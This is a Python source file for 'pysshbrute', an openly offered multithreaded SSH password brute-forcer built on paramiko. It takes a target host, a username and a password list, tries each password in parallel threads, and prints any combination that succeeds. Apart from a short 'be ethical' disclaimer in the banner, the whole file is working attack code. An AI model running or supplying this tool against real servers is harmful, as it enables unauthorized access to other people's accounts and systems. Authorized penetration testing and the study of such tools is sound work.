"""
# Author: cyberkhalid
# Twitter: https://twitter.com/_cyberkhalid
# Github: https://github.com/cyberkhalid/
# Date: 06-04-2022

--------------------------------------------------------------------------------------------------------------------
pysshbrute is a fast ssh bruteforcer written in python3. It uses multithreading to speedup the bruteforcing process.
--------------------------------------------------------------------------------------------------------------------
"""

import paramiko
import socket
import time
import argparse
from concurrent.futures import ThreadPoolExecutor

def banner():
    banner_msg = '''
        ----------------------------------------------------------------
        |Author: cyberkhalid                                           |
        |Twitter: @_cyberkhalid                                        |
        |Disclaimer: Be ethical, do not use it for malicous activities.|
        ----------------------------------------------------------------
        '''
    print(banner_msg)

def check_ssh_server(hostname, port):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(hostname = hostname, port = port,username = None, password = None, timeout = 5)
    except paramiko.AuthenticationException:
        pass
    except Exception as e:
        print("[+] ssh server error: ", e)
        exit(1)

def bruteforce(hostname, username, password,port = 22):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(hostname = hostname, port = port,username = username, password = password, timeout = 5)
    except socket.timeout:
        print("[+] host unreacheable")
        return
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("[-] Can't connect to ssh server")
        return
    except paramiko.ssh_exception.PasswordRequiredException:
        print("[-] Provide Credential")
        return
    except paramiko.AuthenticationException:
        print(f"[!] Failed -> {username}:{password}")
        return
    except paramiko.SSHException:
        print("[-] ssh error")
        exit(1)
    else:
        print(f"[+] Success -> {username}:{password}")


def main():
    parser = argparse.ArgumentParser(description = "pysshbrute fast ssh bruteforcer")
    parser.add_argument("host", help = "Ip address or hostname of the target ssh server")
    parser.add_argument("--port", "--port", default = 22, help = "port onwhich ssh server is running, it is port 22 by default")
    parser.add_argument("-u", "--user", help = "username of the target ssh server")
    parser.add_argument("-p", "--password", help = "password of the target ssh server")
    parser.add_argument("-P", "--passwordfile", help = "password list")
    parser.add_argument("-t", "--thread", type = int, default = 10, help = "number of thread, default to 10")


    args = parser.parse_args()
    host = args.host
    user = args.user
    port = args.port
    password = args.password
    passfile = args.passwordfile
    thread = args.thread

    banner()

    check_ssh_server(host, port)

    if passfile:
        with open(passfile, "r") as f:
            passwords = f.read().splitlines()
        with ThreadPoolExecutor(max_workers = thread) as worker:
            for password in passwords:
                worker.submit(bruteforce, host, user, password, port)
    bruteforce(host, user, password, port = port)

if __name__== '__main__':
    main()